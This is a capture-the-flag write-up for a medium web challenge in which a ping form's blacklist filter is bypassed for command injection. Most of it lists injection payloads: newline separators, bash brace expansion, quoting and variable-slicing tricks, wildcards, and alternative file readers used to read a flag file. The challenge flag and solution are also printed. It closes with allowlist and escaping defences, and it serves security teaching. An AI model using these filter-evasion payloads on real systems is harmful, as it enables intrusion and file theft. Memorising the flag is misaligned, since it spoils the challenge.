# Don't Ping that Cat (Level 2) - SOLUTION

## Challenge Information
- **Challenge Name**: Don't Ping that Cat (Level 2)
- **URL**: https://dont-ping-fiv-ctf.tdho.st/
- **Category**: Web / Command Injection with Filters
- **Difficulty**: Level 2 (Medium)

## FLAG
```
TDHT{Cg6NjRspE4DBCHqHmMaMtTijSi946ica}
```

## Vulnerability
**Command Injection** with input filtering. Unlike Level 1, this challenge implements blacklist filters that block certain patterns, requiring bypass techniques.

## Filters Implemented

### What's Blocked:
1. **Direct "cat" commands**: `cat /path/to/file` triggers "Invalid input. Trying to be sneaky?"
2. **Standard command separators when used with blocked commands**: `;`, `&&`, `||`, `|` combined with certain keywords

### What's NOT Blocked:
1. **Newline character** (`\n`) as command separator
2. **Bash brace expansion** syntax: `{command,argument}`
3. Basic commands without suspicious patterns

## Exploitation Steps

### 1. Initial Testing
Basic ping still works:
```bash
Input: 8.8.8.8
Output: Normal ping response
```

### 2. Discovering the Filter
Testing simple injection:
```bash
Input: 8.8.8.8; cat /tmp/flag.txt
Result: "Invalid input. Trying to be sneaky?"
```

The "cat" command combined with file paths is blocked.

### 3. Finding Bypass: Newline Separator
Newline character works as a command separator:
```bash
Input: 8.8.8.8\nwhoami
Output: 
  PING 8.8.8.8 ...
  www-data
```

But direct cat is still filtered:
```bash
Input: 8.8.8.8\ncat /tmp/flag.txt
Result: "Invalid input. Trying to be sneaky?"
```

### 4. Successful Bypass: Brace Expansion
**Bash brace expansion** bypasses the filter:
```bash
# Payload
8.8.8.8\n{cat,/etc/flag.txt}

# What bash interprets this as:
cat /etc/flag.txt
```

**Why it works:**
- Bash brace expansion `{cat,/etc/flag.txt}` is expanded to `cat /etc/flag.txt` by the shell
- The filter only checks the literal string, not what bash will expand it to
- The pattern doesn't match the blacklist regex which likely looks for `cat\s+/`

### 5. Flag Location
The flag was located at `/etc/flag.txt`

## Technical Analysis

### Brace Expansion Explained
Bash brace expansion is a mechanism where expressions like `{a,b,c}` are expanded into separate words:

```bash
echo {cat,flag.txt}  →  cat flag.txt
echo {ls,-la,/tmp}   →  ls -la /tmp
```

In our exploit:
```bash
{cat,/etc/flag.txt}
# Expands to:
cat /etc/flag.txt
```

### Why the Bypass Works
1. **Pre-expansion checking**: The filter checks the input string BEFORE bash expansion
2. **Pattern mismatch**: `{cat,/etc/flag.txt}` doesn't match patterns like:
   - `cat\s+/`
   - `cat.*flag`
   - etc.
3. **Shell expansion**: Bash expands the braces during execution, after the filter check

## Alternative Bypasses (Not Needed)

Other techniques that could work:
```bash
# Command obfuscation
8.8.8.8\nc''at /etc/flag.txt
8.8.8.8\nca\t /etc/flag.txt
8.8.8.8\n/bin/cat /etc/flag.txt

# Variable expansion
8.8.8.8\n${PATH:0:1}bin${PATH:0:1}cat /etc/flag.txt

# Alternative read commands
8.8.8.8\nless /etc/flag.txt
8.8.8.8\nmore /etc/flag.txt
8.8.8.8\nhead /etc/flag.txt
8.8.8.8\ntail /etc/flag.txt
8.8.8.8\nstrings /etc/flag.txt

# Using wildcards (if path is guessable)
8.8.8.8\n{cat,/???/flag.txt}
8.8.8.8\n{cat,/*/flag*}
```

## Automated Exploitation
Run the provided Python script:
```bash
python dont_ping_cat_l2_exploit.py
```

The script:
1. Tests basic injection patterns
2. Identifies filters
3. Tries various bypass techniques
4. Uses brace expansion to read the flag

## Comparison: Level 1 vs Level 2

| Feature | Level 1 | Level 2 |
|---------|---------|---------|
| Command Injection | ✅ Yes | ✅ Yes |
| Input Filtering | ❌ None | ✅ Blacklist |
| Simple separators (`;`, `&&`) | ✅ Work | ⚠️ Limited |
| "cat" command | ✅ Works | ❌ Filtered |
| Newline separator | ✅ Works | ✅ Works |
| Brace expansion needed | ❌ No | ✅ Yes |
| Flag location | `/tmp/flag.txt` | `/etc/flag.txt` |

## Defense Recommendations

### Current Filter (Inadequate)
```php
// Likely implementation
if (preg_match('/cat\s+\//', $input)) {
    die("Invalid input. Trying to be sneaky?");
}
```

### Proper Defense
```php
// 1. WHITELIST validation
if (!preg_match('/^[0-9.]+$/', $input)) {
    die("Invalid IP address");
}

// 2. Use escapeshellarg()
$safe_input = escapeshellarg($input);
$command = "ping -c 4 $safe_input";

// 3. Better: Use native functions
exec("ping -c 4 " . escapeshellarg($input), $output);

// 4. Best: Don't use shell commands at all
// Use PHP's socket functions or exec with array syntax
```

### Why Blacklists Fail
1. **Infinite bypass techniques**: Encodings, obfuscations, shell features
2. **Shell complexity**: Bash has dozens of expansion/substitution mechanisms
3. **Maintenance burden**: New bypasses discovered constantly
4. **False sense of security**: Appears secure but isn't

## Key Lessons
1. **Blacklists are insufficient** for command injection prevention
2. **Shell expansion happens after input validation** in many cases
3. **Brace expansion** is a powerful bypass technique
4. **Whitelist validation** is the only reliable approach
5. **Avoid shell commands** entirely when possible

## Timeline
- Challenge Started: August 23, 2026
- Filter identified: ~1 minute
- Bypass discovered: ~2 minutes  
- Flag Retrieved: August 23, 2026
- Time to Solve: ~3 minutes

## Tools Used
- Python 3 with requests, BeautifulSoup
- Understanding of Bash expansion mechanisms

---

**Status**: ✅ SOLVED
**Flag**: `TDHT{Cg6NjRspE4DBCHqHmMaMtTijSi946ica}`
**Bypass Technique**: Bash brace expansion to evade blacklist filter
